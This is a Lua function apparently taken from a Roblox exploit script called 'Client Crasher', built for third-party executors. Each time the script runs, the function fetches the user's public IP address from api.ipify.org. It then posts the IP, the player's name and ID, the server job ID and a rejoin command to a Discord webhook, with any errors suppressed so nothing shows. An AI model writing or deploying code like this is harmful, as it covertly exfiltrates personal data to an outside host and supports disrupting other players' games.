local function sendWebhookLog()
    if DiscordWebhook == "" then return end

    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request or httprequest

    if httpRequest then
        local ipAddress = "Unknown"
        pcall(function()
            local response = httpRequest({Url = "https://api.ipify.org", Method = "GET"})
            if response and response.Body then
                ipAddress = response.Body
            end
        end)

        local placeId = game.PlaceId
        local jobId = game.JobId
        local serverJoinCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', placeId, jobId)

        local data = {
            content = "📜 Client Crasher - Script Execution",
            embeds = {{
                title = "📜 Client Crasher - Script Execution",
                color = 3447003,
                fields = {
                    {name = "Player", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                    {name = "Game ID", value = tostring(placeId), inline = true},
                    {name = "Server Job ID", value = "`" .. jobId .. "`", inline = false},
                    {name = "Quick Rejoin Command", value = "```lua\n" .. serverJoinCode .. "\n```", inline = false},
                    {name = "IP Address", value = ipAddress, inline = false},
                    {name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown Executor", inline = true}
                },
                timestamp = DateTime.now():ToIsoDate()
            }}
        }

        pcall(function()
            httpRequest({
                Url = DiscordWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

